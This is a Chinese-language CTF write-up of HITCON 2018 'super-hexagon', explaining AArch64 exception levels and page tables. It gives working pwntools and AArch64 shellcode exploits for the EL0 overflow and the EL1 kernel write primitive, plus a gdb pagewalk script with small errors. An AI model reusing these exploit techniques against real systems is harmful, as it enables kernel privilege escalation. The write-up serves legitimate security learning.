## Arm

最近想深入了解 Arm 架構的 binary 以及相關保護機制如 TrustZone，因此透過打這道 CTF 題目以及看相關文件來了解 Arm 的知識。



### AArch64 Preliminaries

- all instructions are fixed to **4-bytes**, with the 2-byte Thumb model completely removed
- Exception Levels (EL): EL0, EL1, EL2, EL3
  - EL0 - user mode
  - EL1 the supervisor
  - EL2 typically the hypervisor
  - EL3 the trusted firmware or secure monitor (for trustzone)
- Each exception level, except EL2, has a **secure** or **non-secure** mode
  - controlled by NS bit, change by interrupt (SMC - Secure Monitor Call)
    - `svc` - Supervisor Call
    - `hvc` - Hypervisor Call
    - `smc` - Secure Monitor Call

![AArch64 Data Flow](https://hernan.de/assets/posts/super-hexagon-a-journey-from-el0-to-s-el3/aarch64-information-flow.png)

![img](https://i.imgur.com/veZfIPB.png)



### HitconCTF_2018 super-hexagon

README:

```
Flags have to be read from 8 sysregs: s3_3_c15_c12_0 ~ s3_3_c15_c12_7
For example, in aarch64, you may use:

        mrs x0, s3_3_c15_c12_0
        mrs x1, s3_3_c15_c12_1
                         .
                         .
                         .
        mrs x7, s3_3_c15_c12_7

For first two stages, EL0 and EL1, `print_flag' functions are included.
Make good use of them.

qemu-system-aarch64, based on qemu-3.0.0, is also patched to support this
feature. See `qemu.patch' for more details.
```

`binwalk --dd=".*" ./bios.bin` 從 BIOS 當中抽出目標執行檔：

```
// file
ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, with debug_info, not stripped

// checksec
[*] '/home/u1f383/release/super_hexagon/share/_bios.bin.extracted/chal'
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

打開 IDA 後指令集需選擇 Arm-Little Endian。



#### EL0

`run()` 的 function 當中使用了 function pointer array 來呼叫 function：

```c
cmdtb[cmd](buf, idx, v0);
```

不過在呼叫 function `scanf()` 時，會發現內部實作使用了 `gets(input)`，而 `input` 位於 `cmdtb` 上方，因此可以透過 `input` OOB 蓋掉 `cmdtb` 成 `print_flag()` 來拿到 flag，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *

r = remote('localhost', 6666)
print_flag = 0x400104

r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'A'*0x100 + p64(print_flag))
r.interactive()
```



#### EL1

要做到 kernel exploit，我們必須要先能執行任意的 shellcode，為此需要透過第一階段的 BOF 使得我們寫入的 data 可以被執行。不過因為 section 的權限保護，因此需要透過 `mprotect()` 與 `mmap()` 來改變 section 的保護權限，而 `mmap` 與 `mprotect` 皆需透過 `svc` (Supervisor Call causes an exception to be taken to EL1) instruction 來向 kernel 請求資源。

由於 `cmdtb[cmd](buf, idx, v0);` 的三個參數剛好都是可以控制的，因此可以用來執行 `mprotect()`：

```python
#!/usr/bin/python3

from pwn import *

r = remote('localhost', 6666)
print_flag = 0x400104
mprotect = 0x401B68

EXEC = 4
WRITE = 2
READ = 1

# mprotect(addr, 0x1000, RWX)
r.sendlineafter('cmd> ', b'1'.ljust(0x100, b'\x00') + p64(print_flag) + p64(mprotect))
r.sendlineafter('index: ', str(0x1000))
r.sendlineafter('key: ', '1'*(READ | WRITE | EXEC))

r.interactive()
```

不過因為 ARM 處理器有對 page permission 做 W^X 的保護 (`ERROR:   [VMM] RWX pages are not allowed `)，因此同個 page 不能同時做 execute 與 write，而只需要先寫後再執行就可以繞掉了：

```python
#!/usr/bin/python3

from pwn import *

r = remote('localhost', 6666)
print_flag = 0x400104
mprotect = 0x401B68
gets = 0x4019B0
addr = 0x00007ffeffffd000

EXEC = 4
WRITE = 2
READ = 1
input(">")

# gets(addr)
r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'0'.ljust(0x100, b'\x00') + p64(gets))

input(">shellcode")
r.sendline(b'\x00'*0x30 + bytes.fromhex('1f2003d51f2003d51f2003d51f2003d5c0035fd6'))

input(">")
# mprotect(addr, 0x1000, R-X)
r.sendlineafter('cmd> ', b'1'.ljust(0x100, b'\x00') + p64(print_flag) + p64(mprotect))
r.sendlineafter('index: ', str(0x1000))
r.sendlineafter('key: ', '1'*(READ | EXEC))

# call addr
r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'A'*0x100 + p64(addr + 0x30))

r.interactive()
```



當可以執行任意 shellcode，轉回去分析 bios.bin 以及 qemu 的 match：

```c
// qemu.patch
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
```

|                 | from       | to             |
| --------------- | ---------- | -------------- |
| VIRT_FLASH      | 0          | 0x08000000     |
| VIRT_CPUPERIPHS | 0x08000000 | 0x00020000     |
| VIRT_UART       | 0x09000000 | 0x00001000     |
| VIRT_SECURE_MEM | 0x0e000000 | 0x01000000     |
| VIRT_MEM        | 0x40000000 | RAMLIMIT_BYTES |



丟進 IDA 後選 ARM Little-Endian，並在 0x000000 按 C，告訴 IDA 該處為 code，之後分析 `sub_0`：

```c
...
  _WriteStatusReg(ARM64_SYSREG(3, 6, 1, 0, 0), 0x30C50830ui64);
  __isb(0xFu);
  _WriteStatusReg(ARM64_SYSREG(3, 6, 12, 0, 0), sub_2000);
  __isb(0xFu);
...
  memcpy(0xE000000i64, 0x2850i64, 0x68i64);
  memcpy(0x40100000i64, 0x10000i64, 0x10000i64); // EL2
  memcpy(0xE400000i64, 0x20000i64, 0x90000i64); // SEL1 (I dont know why)
  memcpy(0x40000000i64, sub_B0000, 0x10000i64); // EL1
...
```

前面的部分是對 register 做讀寫，對應 register 可以查閱手冊，或是使用 [ida-arm-system-highlight](https://github.com/gdelugre/ida-arm-system-highlight/blob/master/highlight_arm_system_insn.py) 來產生指令詳細操作的 comment，而 [AMIE](https://github.com/NeatMonster/AMIE) 能縮減 MSR 與 MRS 指令的表示方式，讓逆向的時候更清楚指令使用到哪個 register。

|                 | Level                  | from       | to             |
| --------------- | ---------------------- | ---------- | -------------- |
| VIRT_FLASH      | SEL3 monitor           | 0          | 0x08000000     |
| VIRT_CPUPERIPHS |                        | 0x08000000 | 0x00020000     |
| VIRT_UART       |                        | 0x09000000 | 0x00001000     |
| VIRT_SECURE_MEM |                        | 0x0e000000 | 0x0e400000     |
| VIRT_SECURE_MEM | SEL1 (32-bit) Trust OS | 0x0e400000 | 0x0e490000     |
| VIRT_SECURE_MEM |                        | 0x0e490000 | 0x01000000     |
| VIRT_MEM        | EL1 kernel             | 0x40000000 | 0x40010000     |
| VIRT_MEM        |                        | 0x40010000 | 0x40100000     |
| VIRT_MEM        | EL2 hypervisor         | 0x40100000 | 0x40110000     |
| VIRT_MEM        |                        | 0x40110000 | RAMLIMIT_BYTES |

而後用 `dd` 將各個 level 的 binary dump 出來：

```bash
#!/bin/sh
dd if=bios.bin of=unknown.bin skip=10320 bs=1 count=104
dd if=bios.bin of=el2.bin skip=65536 bs=1 count=65536
dd if=bios.bin of=sel1.bin skip=131072 bs=1 count=589824
dd if=bios.bin of=el1.bin skip=720896 bs=1 count=65536
```

而當前目標是要分析 **el1.bin**，也就是 OS，將 **el1.bin** 拖到 IDA 後可以 Edit --> Section --> Rebase Program 到 `0xFFFFFFFFC0000000`，因為前一階段在執行 **keystore** 時，當 `svc` 被呼叫，**gdb-multiarch** 會跳到 `0xFFFFFFFFC0000000 + offset` 的位置，因此能知道 kernel 的 base 會是 `0xFFFFFFFFC0000000`

AArch64 EL1 (secure and non-secure mode) 有兩個 virtual memory mapping

- (D13.2.135) TTBR0 - typically corresponds to **user mode processes**
  - Holds the base address of the translation table for the initial lookup for stage 1 of the translation of an address from the l**ower VA range** in the EL1&0 translation regime, and other information for this translation regime.
- (D13.2.138) TTBR1 - defines the mappings for the **kernel space**
  - Holds the base address of the translation table for the initial lookup for stage 1 of the translation of an address from the **higher VA range** in the EL1&0 stage 1 translation regime, and other information for this translation regime.
- P. 2723 - Figure D5-13 AArch64 TTBRn boundaries and VA ranges for 48-bit VAs
- Memory regions
  - ![img](https://i.imgur.com/nUBr0no.png)

我們接下來會分析 el1 的 `svc` handler，因為這是 user mode program 唯一跟 kernel 溝通的方式，不過在分析前，必須對 AArch64 的基本知識有更多認識：

- VBAR - vector 的 base address
- ELR - exception return address
- TTBR - translation table 的 base address
- TCR - 關於 translation table 的 setting

|        異常級別         | `TTBR`註冊名稱 | `TCR`註冊名稱 | 本次有使用 |
| :---------------------: | :------------: | :-----------: | :--------: |
|           EL0           |      沒有      |     沒有      |     -      |
|    EL1（用於kernel）    |  `TTBR0_EL1`   |   `TCR_EL1`   |     ✔      |
| EL1（用於 user space）  |  `TTBR1_EL1`   |     同上      |     ✔      |
| EL2（不使用管理程式時） |  `TTBR0_EL2`   |   `TCR_EL2`   |     ✖      |
|  EL2（使用管理程式時）  |  `VTTBR_EL2`   |  `VTCR_EL2`   |     ✔      |
|          S-EL3          |  `TTBR0_EL3`   |   `TCR_EL3`   |     ✔      |

- 當啟用分頁的 CPU 通過 VA 接收 memory access 時，它會參考適當的頁表並執行 page traverse（VA --> PA）
  - Page walking 是一項開銷很大的操作，因為它需要多個 page reference 來將 VA 解析為 PA，這就是 CPU`TLB` 稱為 (Translation Lookaside Buffer) 的 translation cache 的原因，AArch64 也是這種情況
- AArch64 中除了 EL0，每個異常級別 (EL) 都有一個或多個 translation table register，意味著可能存在一個（`EL1`、`EL2`、`S-EL3` ）不同的 virtual memory space，對於此題目也是一樣
  - 在 S-EL3 中，`TTBR0_EL3`並在啟動時`TCR_EL3`初始化
  - 在 EL2 中，`VTTBR_EL2`並被`VTCR_EL2`初始化
  - 在 EL1 中，`TTBR0_EL0`（for user space）和`TTBR1_EL1`（for kernel）`TCR_EL1`被初始化。
- 每個 register 具有以下功能：
  - `TTBR` - 特定的 EL 的 page table 的 physical base address
    - Translation Table Base Register 
  - `VTTBR` - page table 的 physical base address，以便在使用管理 process 時使用
    - 與 TTBR 重複功能?
    - Virtualization Translation Table Base Register
  - `TCR` - 用於更改 page table 的資訊，例如 page granularity `TG0=4KB,16KB,64KB` 和 VA space range (`T0SZ`)
    - Translation Control Register
- 實際的頁表結構是一個多級樹結構，其中描述了頁權限並最終轉換為物理地址值。

執行過程中各個 register 的值：

- EL1
  - TTBR0_EL1 - 0x20000
  - TTBR1_EL1 - 0x1b000
  - TCR_EL1 - 0x6080100010
- EL2
  - TTBR0_EL2 - 0x0
  - TCR_EL2 - 0x0
  - VTTBR_EL2 - 0x40106000
  - VTCR_EL2 - 0x80000027
- EL3
  - TTBR0_EL3 - 0xe203000
  - TCR_EL3 - 0x100022

因為 `svc` 屬於 synchronous exception，加上 arch 又是 AArch64，因此會執行 `VBAR_EL1 + 0x400` 的 exception handler

<img src="https://hernan.de/assets/posts/super-hexagon-a-journey-from-el0-to-s-el3/el1-sync-irq.png" alt="EL1 Handling EL0 SVC" style="zoom:50%;" />

P.S. 這邊發現 gdb 當中沒辦法印出 `VBAR_EL1`，反而 `VBAR` 能夠印出正確的位置 (`0xffffffffc000a000`)

- |  EL   | `VBAR`註冊名稱 | 題目需要 |
  | :---: | :------------: | :------: |
  |  EL0  |    沒有任何    |    -     |
  |  EL1  |     `VBAR`     |    ✔     |
  |  EL2  |   `VBAR_EL2`   |    ✔     |
  | S-EL3 |   `VBAR_EL3`   |    ✔     |



- When high exception vectors are not selected, holds the **vector base address** for exceptions that are not taken to Monitor mode or to Hyp mode
- Software must program **VBAR(NS)** with the required initial value as part of the PE boot sequence

所以 `0xffffffffc000a000 + 0x400` 會跳轉到 **sync_interrupt_handler**：

```asm
ROM:FFFFFFFFC000A400 ; ---------------------------------------------------------------------------
ROM:FFFFFFFFC000A400                 STR             X30, [SP,#0xF0]
ROM:FFFFFFFFC000A404                 B               sync_interrupt_handler
ROM:FFFFFFFFC000A404 ; ---------------------------------------------------------------------------
ROM:FFFFFFFFC000A408                 ALIGN 0x80
ROM:FFFFFFFFC000A480                 DCB 0x20
```

P.S. 因為 exception vector 的 size 是 0x80，因此在使用 IDA 時，可以在後方按 `l` 調整 align 成 0x80

```asm
ROM:FFFFFFFFC000A80C sync_interrupt_handler                  ; CODE XREF: ROM:FFFFFFFFC000A404↑j
ROM:FFFFFFFFC000A80C
ROM:FFFFFFFFC000A80C arg_110         =  0x110
ROM:FFFFFFFFC000A80C arg_170         =  0x170
ROM:FFFFFFFFC000A80C
ROM:FFFFFFFFC000A80C                 BL              save_context
ROM:FFFFFFFFC000A810                 MRS             X0, TTBR0_EL1 ; [<] TTBR0_EL1 (Translation Table Base Register 0 (EL1))
ROM:FFFFFFFFC000A814                 STR             X0, [SP,#arg_170]
ROM:FFFFFFFFC000A818                 MOV             X6, SP
ROM:FFFFFFFFC000A81C                 LDR             X12, [SP,#arg_110]
ROM:FFFFFFFFC000A820                 MSR             SPSel, #0 ; Select PSTATE.SP = SP_EL0
ROM:FFFFFFFFC000A824                 MOV             SP, X12
ROM:FFFFFFFFC000A828                 MOV             X0, X6
ROM:FFFFFFFFC000A82C                 BL              handle_syscall
ROM:FFFFFFFFC000A830                 BL              transition_um
```

- `save_context` 將當前的 register 存入 EL0 的 stack 當中
- 逆 `handle_syscall` 時可以參考 https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm64-64_bit

`handle_syscall` 在執行 read syscall 時並沒有檢查 address 是否 destination 在 user space 當中，因此可以蓋到 kernel space 的內容：

```c
__int64 __fastcall handle_syscall(unsigned __int64 *param)
{
  ...
  if ( _ReadStatusReg(ESR_EL1) >> 26 != 21 )
    cpuidle();
  x0 = *param;
  x1 = param[1];
  x2 = param[2];
  x3 = param[3];
  syscall_NR = param[8];
  switch ( syscall_NR )
  {
    case _NR_SYSCALL_READ:
      if ( x2 )
      {
        syscall_NR = read_one_byte();
        if ( (syscall_NR & 0x80000000) != 0 )
        {
          x2 = -1i64;
        }
        else
        {
          *x1 = syscall_NR; // overwrite one byte
          x2 = 1i64;
        }
      }
      break;
  ...
```

- 由於可以透過 `syscall_read` 寫 kernel space，因此我們有 **kernel-level write-what-where primitive**
- 不過其他 function 看似也沒有做 address check



攻擊方法為：

- 透過 `read()` 沒有做 address check 來寫 `print_el1_flag` 的 address 在 stack 後方

- 完成後再透過 overwrite 1 byte + gadget，控制 `pc` 到 `print_el1_flag`，而 gadget 要選可以控制 `X29` 後接 `RET` 的，並且 return address 只有一個 byte 可以調整

  - ```asm
    ROM:FFFFFFFFC0009430                 LDP             X19, X20, [SP,#var_s10]
    ROM:FFFFFFFFC0009434                 LDP             X29, X30, [SP+var_s0],#0x20
    ```

  - 用 IDA search text `ffffffffc000[0-9A-F]{2}30` 來找

AArch64 用來寫入 `print_el1_flag` 位址與 return address 的 shellcode：

```asm
.section .text
.global _start
_start: 
    LDR X10, =0xffffffffc0019c00
    MOV X9, #0
    .loop:
        MOV X0, #0
        ADD X1, X10, X9
        MOV W2, #1
        MOV X8, #0x3f
        SVC 0 // read(0, buffer=target, n=1)
        ADD X9, X9, #1
        MOV X11, #0x10 // do 0x10 time
        CMP X9, X11
    B.MI .loop
	# overwrite return gadget
	# and return to print_el1_flag
    LDR X10, =0xffffffffc0019bb8+1
    NOP
    MOV X0, #0
    ADD X1, X10, #0
    MOV W2, #1
    MOV X8, #0x3f
    SVC 0

# compile: aarch64-linux-gnu-as ./sc.s
# check: aarch64-linux-gnu-objdump -d ./a.out
# extract .text: aarch64-linux-gnu-objcopy -I elf64-littleaarch64 -j .text -O binary ./a.out ./output
```

最終 EL1 的 exploit 如下：

```python
#!/usr/bin/python3

from pwn import *

r = remote('localhost', 6666)
print_flag = 0x400104
print_el1_flag = 0xFFFFFFFFC0008408
mprotect = 0x401B68
gets = 0x4019B0
addr = 0x00007ffeffffd000

EXEC = 4
WRITE = 2
READ = 1
input(">")

# gets(addr)
r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'0'.ljust(0x100, b'\x00') + p64(gets))

sc = open('./output', 'rb').read()
r.sendline(b'\x00'*0x30 + sc)

# mprotect(addr, 0x1000, R-X)
r.sendlineafter('cmd> ', b'1'.ljust(0x100, b'\x00') + p64(print_flag) + p64(mprotect))
r.sendlineafter('index: ', str(0x1000))
r.sendlineafter('key: ', '1'*(READ | EXEC))

# call addr
r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'A'*0x100 + p64(addr + 0x30))

input('>')
r.send(b'A'*8 + p64(print_el1_flag))

input('> ')
r.send(b'\x94')
r.interactive()
```



為了要做到 EL1 任意執行 shellcode，需要做下一步的準備。以下為 EL1 在使用 TTBR 的情況，當 address prefix 為 kernel mode 使用 TTBR1_EL1，當 address prefix 為 user mode 時使用 TTBR0_EL1：

![image-20211116213001312](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116213001312.png)

而 TCR_EL1 的 **T0SZ** 與 **T1SZ** 是控制 range of address translation：

![image-20211116213232722](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116213232722.png)

page walk — a translation from a virtual to a physical address

- 代價很高 (multiple lookups required to resolve a VA to PA)
- processors 用 translation cache called the Translation Lookaside Buffer (TLB) 來增加速度，AArch64 也使用相同的硬體機制
- Each Exception Level in AArch64, except for EL0 has one or more translation table registers
  - This means there can be at least three different virtual memory spaces (EL1, EL2, EL3)
- 開機 (boot) 時：
  - EL3 --> `TTBR0_EL3` and `TCR_EL3`
  - EL2 --> `VTTBR_EL2` and `VTCR_EL2`
  - EL1 --> `TTBR0_EL1` (user) and `TTBR1_EL1` ()





EL0 shellcode，會做以下的事情：

- `mmap()` 分配給 el1 執行的 shellcode region
  - 先用 RW
  - 寫完 shellcode 改成 RX
- 透過 pagewalk 找到描述該 VA 的 page entry，蓋掉 PXN 與 UXN (寫成 0x00)
- 分配一個新的 memory region flush TLB，避免 cache 住 page 的 upper attributes
- 在 `syscall_handler` 的 return 後方 + 0x30 處寫 el1 shellcode address
  - el1 shellcode address 會用 python script 傳入
- 透過將 return address overwrite 1 byte 成 `FFFFFFFFC0009430`，最終跳到我們寫的 el1 shellcode

```asm
.section .text
.global _start

_start: 
    // mmap(0, 0x1000, 3, 0, 0, -1)
    MOV X0, XZR // XZR is zero register
    MOV X1, #0x1000 // len=0x1000
    MOV W2, #3 // prot=rw
    MOV W3, #0 // fd=0
    MOV W4, #0 // flags=0
    MOV X5, #-1 // offset=-1
    MOV X8, #0xde
    SVC 0
    // will return 0x7ffeffffc000
    // pagewalk output: [last] ffffffffc0028fe0 -> 00007ffeffffc000: 0x0000000000035000 [PXN UXN ELx/RW]

    // X22 is shellcode page
    MOV X22, X0

    // gets(mmap_buffer) to read shellcode
    MOV X0, X22
    LDR X8, =0x4019B0
    BLR X8

    // change prot of mmap_buffer
    // mprotect(mmap_buffer, 0x1000, 5)
    MOV X0, X22
    MOV X1, #0x1000
    MOV W2, #5 // rx
    MOV X8, #0xe2
    SVC 0

    LDR X12, =0xffffffffc0028fe0
    MOV X0, XZR
    ADD X1, X12, #6 // overwrite [54:53]
    MOV W2, #1
    MOV X8, #0x3f
    SVC 0
    // after: [last] ffffffffc0028fe0 -> 00007ffeffffc000: 0x0000000000035000 [ELx/R]

    // we need to mmap a new memory to flush TLB
    MOV X0, XZR // XZR is zero register
    MOV X1, #0x1000 // len=0x1000
    MOV W2, #3 // prot=rw
    MOV W3, #0 // fd=0
    MOV W4, #0 // flags=0
    MOV X5, #-1 // offset=-1
    MOV X8, #0xde
    SVC 0

    // write ROP
    LDR X10, =0xffffffffc0019c00
    MOV X9, #0
    .loop:
        MOV X0, #0
        ADD X1, X10, X9
        MOV W2, #1
        MOV X8, #0x3f
        SVC 0 // read(0, buffer=target, n=1)
        ADD X9, X9, #1
        MOV X11, #0x10 // do 0x10 time
        CMP X9, X11
    B.MI .loop
	# overwrite return gadget
	# and return to print_el1_flag
    LDR X10, =0xffffffffc0019bb8+1
    NOP
    MOV X0, #0
    ADD X1, X10, #0
    MOV W2, #1
    MOV X8, #0x3f
    SVC 0
```

EL1 shellcode，目標是執行 `print_flag()`:

```asm
.section .text
.global _start

_start: 
    LDR x8, =0xFFFFFFFFC0008408
    BLR X8
    NOP
```

python script：

```python
#!/usr/bin/python3

from pwn import *

r = remote('localhost', 6666)
print_flag = 0x400104
mprotect = 0x401B68
gets = 0x4019B0
addr = 0x00007ffeffffd000 # el0 shellcode address
shellcode = 0x7ffeffffc000 # el1 shellcode address

EXEC = 4
WRITE = 2
READ = 1
input(">")

# gets(addr)
r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'0'.ljust(0x100, b'\x00') + p64(gets))

sc = open('./el0', 'rb').read()
r.sendline(b'\x00'*0x30 + sc)

# mprotect(addr, 0x1000, R-X)
r.sendlineafter('cmd> ', b'1'.ljust(0x100, b'\x00') + p64(print_flag) + p64(mprotect))
r.sendlineafter('index: ', str(0x1000))
r.sendlineafter('key: ', '1'*(READ | EXEC))

# call addr
r.sendlineafter('cmd> ', '0')
r.sendlineafter('index: ', b'A'*0x100 + p64(addr + 0x30))

input('>')
el1_sc = open('./el1', 'rb').read()
r.sendline(el1_sc)

input('>')
r.send(b'\x00')

input('> write ROP')
r.send(b'A'*8 + p64(shellcode))

input('> write ret')
r.send(b'\x94')

r.interactive()
```

稍微修改了 [aarch64-pagewalk.py](https://github.com/grant-h/gdbscripts/blob/master/aarch64/aarch64-pagewalk.py)，用自己較好理解的方式將資料印出：

```python
import gdb
import math

KERNEL_BASE = 0xffffffffc0000000

class Pagewalk(gdb.Command):
    def __init__(self):
        self.CPSR_Mbit = {
            0b00: "User",
            0b01: "Kernel",
            0b10: "Hypervisor",
            0b11: "Monitor" 
        }

        super(Pagewalk, self).__init__("pagewalk", gdb.COMMAND_DATA)
    
    def loadq(self, addr):
        v = gdb.parse_and_eval('*(unsigned long long*)(%s)' % addr)
        return int(v)

    # Upper attributes + Lower attributes parsing
    def format_ent(self, ent, S2):
        flags = []
        phy = ent & 0xfffffffff000

        # stage 2
        # intermediate phy addr space --> PA
        if S2:
            XN = (ent >> 53) & 0b11
            # S2AP = Stage 2 data Access Permissions bits
            S2AP = (ent >> 6) & 0b11
            # A = Access flag
            A = (ent >> 10) & 0b1

            if XN == 0:
                pass
            elif XN == 1:
                flags += ['PXN']
            elif XN == 2:
                flags += ['UXN', 'PXN']
            elif XN == 3:
                flags += ['UXN']

            if not A:
                flags += ['!ACC']

            if S2AP == 0:
                flags += ['ELx/NONE']
            elif S2AP == 1:
                flags += ['ELx/R']
            elif S2AP == 2:
                flags += ['ELx/W']
            elif S2AP == 3:
                flags += ['ELx/RW']
        # stage 1
        # VA --> intermediate phy addr space
        else:
            XN = (ent >> 53) & 0b11
            AP = (ent >> 6) & 0b11
            NS = (ent >> 5) & 0b1
            A = (ent >> 10) & 0b1

            if XN & 1:
                flags += ['PXN']
            if XN & 2:
                flags += ['UXN']
            if NS:
                flags += ['NS']
            if not A:
                flags += ['!ACC']
            if AP == 0:
                flags += ['EL1/RW']
            elif AP == 1:
                flags += ['ELx/RW']
            elif AP == 2:
                flags += ['EL1/R']
            elif AP == 3:
                flags += ['ELx/R']

        flags = " ".join(flags)
        return "0x%016lx [%s]" % (phy, flags)

    # pt_pa: page table physical address
    # pt_va: page table virtual address
    def print_table(self, pt_pa, granule_bits, region_sz,
                    pt_va_base=0, upper_region=False):
        # We assume the PA range is 47:0 (48-bits)
        ent_num_bits = granule_bits - 3 # each ent is 8 bytes (2**3)
        # 2**(ent_num_bits) ent
        # 2**3 per ent
        # 2**(3 + ent_num_bits) == 2**granule_bits == size per table
        ent_per_table = 2**(ent_num_bits)

        # round up to nearest level
        print("Calculate level: \t(%d - %d - %d) / %d"
                                % (64, region_sz, granule_bits, ent_num_bits))
        levels = int(math.ceil((64.0 - region_sz - granule_bits) / ent_num_bits))

        print("Entries/table: \t%d" % ent_per_table)
        print("Levels: \t%d" % levels)

        # table addresses are physical. From the perspective of GDB
        # and depending on if the MMU is enabled, we need to find the
        # corresponding virtual address for the page tables
        tables = [[0, pt_pa]]
        next_tables = []

        if upper_region:
            tables[0][0] = 0xffff000000000000

        # stage 2 == el2 ?
        isS2 = self.CurrentEL == 2

        for level in range(levels):
            if len(tables) == 0:
                break

            # D5-2740
            # With the 4KB granule size, for the level 1 descriptor n is 30
            # and for the level 2 descriptor, n is 21
            # 39 / 30 / 21 / 12
            # a indexed by [n:39]
            # b indexed by [38:30]
            # c indexed by [29:21]
            # d indexed by [20:12]
            x = levels - (level+1) + 3 # 6, 5, 4, 3
            rbit = granule_bits + (x-3)*ent_num_bits
            last_level = (level+1) == levels

            print("granule_bits: %d" % granule_bits)
            print("ent_num_bits: %d" % ent_num_bits)
            print("rbit: %d" % rbit)
            print("---- Level %d ----" % level)
            for va, table_addr in tables:
                print("va: %016lx\ntable_addr: %016lx" % (va, table_addr))
                for ent_no in range(ent_per_table):
                    ent = self.loadq(pt_va_base + table_addr + ent_no*8)
                    # new_va == va_base + (idx of entry * table_size)
                    new_va = va | (ent_no << rbit)

                    # D5-2740
                    # table type entry
                    if (ent & 0b11) == 0b11:
                        if last_level:
                            print("[last] %016lx -> %016lx: %s" % (pt_va_base + table_addr + ent_no*8, new_va, self.format_ent(ent, isS2)))
                            # last level mapping
                        else:
                            print("[table] %016lx == %016lx | (%016lx << %d)" % (new_va, va, ent_no, rbit))
                            # last 12 bits is ignore + type
                            # ent & 0xfffffffff000 is the next-level table address
                            next_tables += [[new_va, (ent & 0xfffffff000)]]
                    # block type entry
                    elif (ent & 0b11) == 0b01:
                        print("[block] %016lx: %s" % (new_va, self.format_ent(ent, isS2)))
                
            tables = next_tables
            next_tables = []

    def invoke(self, arg, from_tty):
        argv = list(filter(lambda x: x.strip() != "", arg.split(" ")))
        argc = len(argv)

        SAVED_CPSR = 0
        # G8.2.33 CPSR, Current Program Status Register
        CPSR = int(gdb.parse_and_eval("$cpsr")) & 0xffffffff
        # M, bits [3:0] = Current PE mode
        self.CurrentEL = int(CPSR & 0b1100) >> 2

        if argc >= 1:
            try:
                target_el = int(argv[0])
                
                if target_el < 1 or target_el > 3:
                    print("Invalid argument (ELx >= 1 && ELx <= 3")
                    return

                if target_el != self.CurrentEL:
                    SAVED_CPSR = CPSR
                    CPSR = CPSR & (0b0011)
                    CPSR |= target_el << 2
                    gdb.parse_and_eval('$cpsr = 0x%08x' % CPSR)
                    print("Moving to EL%d (%s)" % (target_el,
                                                    self.CPSR_Mbit[target_el]))
            except ValueError:
                print("Invalid argument (ELx integer required)")
                pass
                
            CPSR = int(gdb.parse_and_eval("$cpsr")) & 0xffffffff
            self.CurrentEL = int(CPSR & 0b1100) >> 2
        
            print("CPSR: EL%d (%s)" % (self.CurrentEL, self.CPSR_Mbit[target_el]))

        print("EL%d (%s)" % (self.CurrentEL, self.CPSR_Mbit[self.CurrentEL]))
        try:
            if self.CurrentEL == 0:
                print("No paging in EL0")
            elif self.CurrentEL == 1:
                TTBR0_EL1 = int(gdb.parse_and_eval('$TTBR0_EL1'))
                TTBR1_EL1 = int(gdb.parse_and_eval('$TTBR1_EL1'))
                # D13.2.123 TCR_EL1, Translation Control Register
                # [15:0] - for usermode
                # [31:16] - for kernel
                TCR_EL1 = int(gdb.parse_and_eval('$TCR_EL1'))

                # translation 0/1 region size (user mode/kernel)
                # T0SZ/T1SZ, bits [5:0]/[21:16] = The size offset of the memory region
                # addressed by TTBR0_EL1/TTBR1_EL1
                T0SZ = TCR_EL1 & 0b111111
                T1SZ = (TCR_EL1 >> 16) & 0b111111
                # Granule size for TTBR0_EL1/TTBR1_EL1
                # I think granule size is table size
                TG0 = (TCR_EL1 >> 14) & 0b11
                TG1 = (TCR_EL1 >> 30) & 0b11
                # IPS, bits [34:32] = Intermediate Physical Address Size
                # 0 -> 32, 1 -> 36, 2 -> 40, etc.
                IPS = (TCR_EL1 >> 32) & 0xb111
                print("IPA Size: %d-bits" % (32 + 4*IPS))

                if TG0 == 0b00:
                    TG0_BITS = 12 # 4KB
                elif TG0 == 0b01:
                    TG0_BITS = 16 # 64KB
                elif TG0 == 0b10:
                    TG0_BITS = 14 # 16KB
                else:
                    print("TG0 reserved")
                
                if TG1 == 0b01:
                    TG1_BITS = 14 # 16KB
                elif TG1 == 0b10:
                    TG1_BITS = 12 # 4KB
                elif TG1 == 0b11:
                    TG1_BITS = 16 # 64KB
                else:
                    print("TG1 reserved")

                print("EL1 kernel region min: \t0x%016lx" % (2**64 - 2**(64-T1SZ)))
                print("EL1 user region max: \t0x%016lx" % (2**(64-T0SZ) - 1))
                print("EL1 kernel page size: \t%dKB" % (2**TG1_BITS >> 10)) # / 1024
                print("EL1 user page size: \t%dKB" % (2**TG0_BITS >> 10)) # / 1024
                print("-------- User mode page table --------")
                self.print_table(TTBR0_EL1, TG0_BITS, T0SZ, pt_va_base=KERNEL_BASE)
                print()
                print("-------- Kernel mode page table --------")
                self.print_table(TTBR1_EL1, TG1_BITS, T1SZ, pt_va_base=KERNEL_BASE, upper_region=True)
                print()
        except:
            pass

Pagewalk()

# source ./pagewalk.py
# gdb> pagewalk
# gdb> pagewalk 1
```







**Others**

- `wfi` - 會讓 CPU 進入 idle
- `STP` - store pair
- AArch64 - X30 為 link register (放 return address)
  - Arm 用 LR



### 手冊相關資料

The Armv8-A architecture defines a set of Exception levels, EL0 to EL3, where

- If ELn is the Exception level, increased values of n indicate increased software execution privilege
- Execution at EL0 is called **unprivileged execution**
- EL2 provides support for **virtualization**
- EL3 provides support for **switching** between two Security states, **Secure state** and **Non-secure state**

state

- Secure state
